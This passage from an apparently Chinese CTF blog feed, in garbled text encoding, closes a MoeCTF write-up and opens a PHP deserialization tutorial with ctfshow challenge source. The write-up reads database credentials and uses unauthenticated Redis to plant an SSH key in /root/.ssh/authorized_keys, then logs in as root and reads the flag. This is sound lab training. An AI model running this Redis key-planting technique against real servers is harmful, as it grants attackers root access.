class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>å¾—åˆ°sqlæ•°æ®åº“äº¤äº’çš„æºç ï¼Œé‡Œé¢æœ‰ç”¨æˆ·åå’Œå¯†ç ã€‚è¿æ¥:</p><pre class="language-python" data-language="python"><code class="language-python">db <span class="token operator">=</span> pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"mysql"</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">3306</span><span class="token punctuation">,</span>user<span class="token operator">=</span><span class="token string">"root"</span><span class="token punctuation">,</span>passwd<span class="token operator">=</span><span class="token string">"The_P0sswOrD_Y0u_Nev3r_Kn0w"</span><span class="token punctuation">,</span>database<span class="token operator">=</span><span class="token string">"messageboard"</span><span class="token punctuation">,</span>charset<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span></code></pre><p>æŸ¥å†…å®¹ï¼š</p><pre class="language-python" data-language="python"><code class="language-python">cursor<span class="token operator">=</span>db<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select database()"</span><span class="token punctuation">)</span>cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'messageboard'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select(group_concat(table_name))from(information_schema.tables)where(table_schema)='messageboard'"</span><span class="token punctuation">)</span><span class="token number">1</span><span class="token operator">>></span><span class="token operator">></span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'flag,message,users'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')"</span><span class="token punctuation">)</span><span class="token number">1</span><span class="token operator">>></span><span class="token operator">></span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select(group_concat(flag))from(flag)"</span><span class="token punctuation">)</span><span class="token number">1</span><span class="token operator">>></span><span class="token operator">></span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'-Are-YOu-myS0L-MasT3r?-'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>æœ€åæ˜¯redisã€‚ç”¨pythonè£…ä¸ªredisæ¨¡å—ï¼ˆä¸çŸ¥é“ä¸ºå•¥apt-get installè£…ä¸äº†ï¼Ÿï¼‰ï¼š</p><pre class="language-python" data-language="python"><code class="language-python">subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token string">"pip3 install redis"</span><span class="token punctuation">,</span>stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>ç„¶åè¿æ¥</p><pre class="language-python" data-language="python"><code class="language-python">r <span class="token operator">=</span> redis<span class="token punctuation">.</span>Redis<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'172.20.0.3'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">6379</span><span class="token punctuation">,</span> db<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>ä»infoä¸­å¾—çŸ¥rediså­˜åœ¨æœªæˆæƒè®¿é—®æ¼æ´ã€‚æ ¹æ® https:&#x2F;&#x2F;_thorns.gitbooks.io&#x2F;sec&#x2F;content&#x2F;redis_getshellzi_dong_hua_shi_jian_zhi_ssh_key.html å¾€rootå†™ssh keyã€‚public_keyå’Œprivkeyåˆ©ç”¨<code>ssh-keygen -t rsa</code>ç”Ÿæˆ</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> r<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'aaaaaaaaaa'</span><span class="token punctuation">,</span> <span class="token string">'\n\n'</span> <span class="token operator">+</span> public_key <span class="token operator">+</span> <span class="token string">'\n\n'</span><span class="token punctuation">)</span><span class="token boolean">True</span><span class="token operator">>></span><span class="token operator">></span> r<span class="token punctuation">.</span>config_set<span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">,</span> <span class="token string">'/root/.ssh'</span><span class="token punctuation">)</span><span class="token boolean">True</span><span class="token operator">>></span><span class="token operator">></span> r<span class="token punctuation">.</span>config_set<span class="token punctuation">(</span><span class="token string">'dbfilename'</span><span class="token punctuation">,</span> <span class="token string">'authorized_keys'</span><span class="token punctuation">)</span><span class="token boolean">True</span><span class="token operator">>></span><span class="token operator">></span> r<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token boolean">True</span></code></pre><p>å‚è€ƒ <a href="https://www.cnblogs.com/wongbingming/articles/12384764.html">https://www.cnblogs.com/wongbingming/articles/12384764.html</a> ï¼Œå®‰è£…paramikoè¿›è¡Œsshè¿æ¥</p><pre class="language-python" data-language="python"><code class="language-python">subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token string">"pip3 install paramiko"</span><span class="token punctuation">,</span>stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">import</span> paramiko<span class="token operator">>></span><span class="token operator">></span> pkey <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>RSAKey<span class="token punctuation">.</span>from_private_key_file<span class="token punctuation">(</span><span class="token string">'privkey'</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> trans <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>Transport<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'172.20.0.3'</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> trans<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>username<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span> pkey<span class="token operator">=</span>pkey<span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> ssh <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>SSHClient<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> ssh<span class="token punctuation">.</span>_transport <span class="token operator">=</span> trans<span class="token operator">>></span><span class="token operator">></span> stdin<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr <span class="token operator">=</span> ssh<span class="token punctuation">.</span>exec_command<span class="token punctuation">(</span><span class="token string">'ls /'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>stdout<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> stdin<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr <span class="token operator">=</span> ssh<span class="token punctuation">.</span>exec_command<span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>stdout<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p> <strong>Flag</strong></p><blockquote><p>moectf{Information-leakage-Is-dangerous!-Are-YOu-myS0L-MasT3r?-P@sSW0Rd-F0r-redis-Is-NeceSsary}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> http </tag>
            
            <tag> MoeCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webå…¥é—¨-php_unserialize</title>
      <link href="/2024/07/13/web%E5%85%A5%E9%97%A8-php_unserialize/"/>
      <url>/2024/07/13/web%E5%85%A5%E9%97%A8-php_unserialize/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p><a href="https://hello-ctf.com/HC_Web/php_unser_base/">PHP åºåˆ—åŒ–åŠååºåˆ—åŒ–åŸºç¡€</a></p><p><a href="https://blog.csdn.net/jayq1/article/details/131858372">ååºåˆ—åŒ–å­¦ä¹ ç¬”è®°</a></p><p><a href="https://blog.csdn.net/solitudi/article/details/113588692">[CTF]PHPååºåˆ—åŒ–æ€»ç»“</a></p><h4 id="é­”æœ¯æ–¹æ³•"><a href="#é­”æœ¯æ–¹æ³•" class="headerlink" title="é­”æœ¯æ–¹æ³•"></a>é­”æœ¯æ–¹æ³•</h4><p>åœ¨ PHP çš„åºåˆ—åŒ–ä¸­ï¼Œé­”æœ¯æ–¹æ³•ï¼ˆMagic Methodsï¼‰æ˜¯ä¸€ç»„ç‰¹æ®Šçš„æ–¹æ³•ï¼Œè¿™äº›æ–¹æ³•ä»¥åŒä¸‹åˆ’çº¿ï¼ˆ<code>__</code>ï¼‰ä½œä¸ºå‰ç¼€ï¼Œå¯ä»¥åœ¨ç‰¹å®šçš„åºåˆ—åŒ–é˜¶æ®µè§¦å‘ä»è€Œä½¿å¼€å‘è€…èƒ½å¤Ÿè¿›ä¸€æ­¥çš„æ§åˆ¶ åºåˆ—åŒ– &#x2F; ååºåˆ—åŒ– çš„è¿‡ç¨‹ã€‚</p><p>ä½ å¯ä»¥åœ¨ PHP å®˜æ–¹æ–‡æ¡£ä¸­æŸ¥æ‰¾åˆ°å¯¹åº”é­”æœ¯æ–¹æ³•çš„å®šä¹‰å’Œä½¿ç”¨æ–¹æ³•ï¼š<a href="https://www.php.net/manual/zh/language.oop5.magic.php">PHP: é­”æœ¯æ–¹æ³• - Manual</a></p><p>ä¸€èˆ¬åœ¨é¢˜ç›®ä¸­å¸¸è§çš„å‡ ä¸ªæ–¹æ³•å¦‚ä¸‹ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//------ æ‰§è¡Œunserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</span><span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//------- æ‰§è¡Œserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</span><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//---- å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘</span><span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//-------- åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span><span class="token function">__callStatic</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//-- åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span><span class="token function">__get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//--------- ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®æˆ–è€…ä¸å­˜åœ¨è¿™ä¸ªé”®éƒ½ä¼šè°ƒç”¨æ­¤æ³•</span><span class="token function">__set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//--------- ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§</span><span class="token function">__isset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//------- åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘</span><span class="token function">__unset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//------- åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘</span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//---- æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘</span><span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//------ å½“å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</span></code></pre><p>ä¸€ä»½æ¯”è¾ƒå…¨é¢çš„è¡¨æ ¼ï¼š</p><table><thead><tr><th align="left">magicMethods</th><th align="left">attribute</th></tr></thead><tbody><tr><td align="left">__construct</td><td align="left">å½“ä¸€ä¸ªå¯¹è±¡è¢«åˆ›å»ºæ—¶è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥åˆå§‹åŒ–å¯¹è±¡çš„å±æ€§ã€‚</td></tr><tr><td align="left">__destruct</td><td align="left">å½“ä¸€ä¸ªå¯¹è±¡è¢«é”€æ¯æ—¶è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥é‡Šæ”¾å¯¹è±¡å ç”¨çš„èµ„æºã€‚</td></tr><tr><td align="left">__call</td><td align="left">åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•æ—¶è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥å®ç°åŠ¨æ€æ–¹æ³•è°ƒç”¨ã€‚</td></tr><tr><td align="left">__callStatic</td><td align="left">åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•æ—¶è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥å®ç°åŠ¨æ€é™æ€æ–¹æ³•è°ƒç”¨ã€‚</td></tr><tr><td align="left">__get</td><td align="left">å½“ä¸€ä¸ªå¯¹è±¡çš„å±æ€§è¢«è¯»å–æ—¶è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥å®ç°å±æ€§çš„è®¿é—®æ§åˆ¶ã€‚</td></tr><tr><td align="left">__set</td><td align="left">å½“ä¸€ä¸ªå¯¹è±¡çš„å±æ€§è¢«è®¾ç½®æ—¶è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥å®ç°å±æ€§çš„è®¿é—®æ§åˆ¶ã€‚</td></tr><tr><td align="left">__isset</td><td align="left">å½“ä½¿ç”¨ isset() æˆ– empty() æµ‹è¯•ä¸€ä¸ªå¯¹è±¡çš„å±æ€§æ—¶è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥å®ç°å±æ€§çš„è®¿é—®æ§åˆ¶ã€‚</td></tr><tr><td align="left">__unset</td><td align="left">å½“ä½¿ç”¨ unset() åˆ é™¤ä¸€ä¸ªå¯¹è±¡çš„å±æ€§æ—¶è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥å®ç°å±æ€§çš„è®¿é—®æ§åˆ¶ã€‚</td></tr><tr><td align="left">__toString</td><td align="left">å½“ä¸€ä¸ªå¯¹è±¡è¢«è½¬æ¢ä¸ºå­—ç¬¦ä¸²æ—¶è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥å®ç°å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨ç¤ºã€‚</td></tr><tr><td align="left">__invoke</td><td align="left">å½“ä¸€ä¸ªå¯¹è±¡è¢«ä½œä¸ºå‡½æ•°è°ƒç”¨æ—¶è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥å®ç°å¯¹è±¡çš„å¯è°ƒç”¨æ€§ã€‚</td></tr><tr><td align="left">__set_state</td><td align="left">å½“ä½¿ç”¨ var_export() å¯¼å‡ºä¸€ä¸ªå¯¹è±¡æ—¶è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥å®ç°å¯¹è±¡çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚</td></tr><tr><td align="left">__clone</td><td align="left">å½“ä¸€ä¸ªå¯¹è±¡è¢«å…‹éš†æ—¶è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥å®ç°å¯¹è±¡çš„å…‹éš†ã€‚</td></tr><tr><td align="left">__debugInfo</td><td align="left">å½“ä½¿ç”¨ var_dump() æˆ– print_r() è¾“å‡ºä¸€ä¸ªå¯¹è±¡æ—¶è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥æ§åˆ¶å¯¹è±¡çš„è°ƒè¯•ä¿¡æ¯è¾“å‡ºã€‚</td></tr><tr><td align="left">__sleep</td><td align="left">åœ¨å¯¹è±¡è¢«åºåˆ—åŒ–ä¹‹å‰è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥æ§åˆ¶å“ªäº›å±æ€§è¢«åºåˆ—åŒ–ã€‚</td></tr><tr><td align="left">__wakeup</td><td align="left">åœ¨å¯¹è±¡è¢«ååºåˆ—åŒ–ä¹‹åè‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥é‡æ–°åˆå§‹åŒ–å¯¹è±¡çš„å±æ€§ã€‚</td></tr></tbody></table><p>PHP å®˜æ–¹æ–‡æ¡£å·²ç»å¾ˆè¯¦ç»†äº†ï¼Œè¿™é‡Œä¸åœ¨èµ˜è¿°ï¼Œä¸ä¸€å®šéœ€è¦å­¦ä¼šæ‰€æœ‰çš„å‡½æ•°ï¼Œé™¤å¼€å¸¸è§çš„ï¼Œå…¶ä»–çš„åœ¨é‡åˆ°çš„æ—¶å€™æŸ¥é˜…å³å¯ã€‚</p><h3 id="web254-278"><a href="#web254-278" class="headerlink" title="web254-278"></a>web254-278</h3><h4 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your flag is "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip, no flag"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>åªè¦è§¦å‘**vipOneKeyGetFlag()**å‡½æ•°å°±å¯ä»¥å¾—åˆ°flag</p><p>è€ƒå¯ŸåŸºç¡€çš„ä»£ç å®¡è®¡ï¼Œæ»¡è¶³<code>$this-&gt;username===$u&amp;&amp;$this-&gt;password===$p</code>å³å¯</p><h4 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your flag is "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip, no flag"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token 